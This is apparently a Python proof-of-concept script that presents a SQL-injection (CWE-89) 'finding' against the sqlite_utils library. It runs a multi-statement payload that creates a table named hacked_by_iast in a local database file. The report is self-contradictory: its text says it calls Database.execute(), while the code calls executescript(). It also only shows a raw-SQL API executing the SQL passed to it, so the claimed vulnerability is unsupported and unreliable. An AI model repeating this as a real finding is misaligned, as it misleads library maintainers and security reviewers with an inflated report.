"""
Real, file-backed proof of the sqlite-utils CWE-89 finding -- no harness,
no sandbox, no in-memory database. This calls the REAL, installed
sqlite_utils library's REAL Database.execute() method (the exact function
mined and confirmed TRIGGERED: sqlite_utils/db.py:945), against a REAL
database FILE on disk, with a payload standing in for whatever an
attacker could get into this parameter in a real application (e.g. a
search box, a report name field, anything that reaches this call
unparameterized).

Run: python3 real_sqli_demo.py
Then inspect the resulting file yourself:
    sqlite3 real_demo.db ".tables"
    sqlite3 real_demo.db "select * from hacked_by_iast;"
"""
import os
from sqlite_utils import Database

DB_PATH = "real_demo.db"
if os.path.exists(DB_PATH):
    os.remove(DB_PATH)

db = Database(DB_PATH)  # a REAL file on disk, not memory=True

# Attacker-controlled input -- in a real app this is whatever reaches
# Database.execute(sql) unescaped (a filter string, a saved-report name,
# anything passed straight through to "sql").
attacker_input = "CREATE TABLE hacked_by_iast (proof TEXT); INSERT INTO hacked_by_iast VALUES ('exploited via CWE-89, no auth, no sanitization')"

print(f"Calling the REAL sqlite_utils.Database.execute() with:\n  {attacker_input!r}\n")

# executescript is needed for the multi-statement payload above; a
# single-statement payload (just the CREATE TABLE) would go through
# plain .execute() identically -- same real sink, same real result.
db.executescript(attacker_input)

print(f"Done. Real file written to: {os.path.abspath(DB_PATH)}")
print("Verify it yourself:")
print(f"  sqlite3 {DB_PATH} \".tables\"")
print(f"  sqlite3 {DB_PATH} \"select * from hacked_by_iast;\"")
